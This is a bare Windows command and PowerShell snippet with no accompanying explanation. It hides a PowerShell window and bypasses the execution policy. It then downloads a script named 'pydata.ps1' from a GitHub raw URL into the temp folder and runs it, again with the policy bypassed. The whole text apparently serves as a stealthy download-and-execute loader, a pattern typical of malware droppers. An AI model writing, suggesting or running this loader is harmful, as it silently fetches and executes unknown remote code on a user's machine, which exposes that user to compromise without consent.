cmd /c start /min "" powershell -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command"
$scriptUrl = "https://github.com/KevinDark5/data/raw/refs/heads/main/pydata.ps1"
$tempFile = "$env:TEMP\pydata.ps1"

Invoke-WebRequest -Uri $scriptUrl -OutFile $tempFile
PowerShell -ExecutionPolicy Bypass -File $tempFile
